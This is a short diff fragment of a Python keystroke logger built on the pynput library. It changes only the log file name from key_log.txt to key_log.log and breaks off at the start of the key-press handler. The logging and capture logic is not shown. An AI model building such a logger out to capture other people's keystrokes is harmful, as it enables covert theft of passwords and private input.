@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 
 # File to log keystrokes
-log_file = "key_log.txt"
+log_file = "key_log.log"
 
 def on_press(key):
     try:
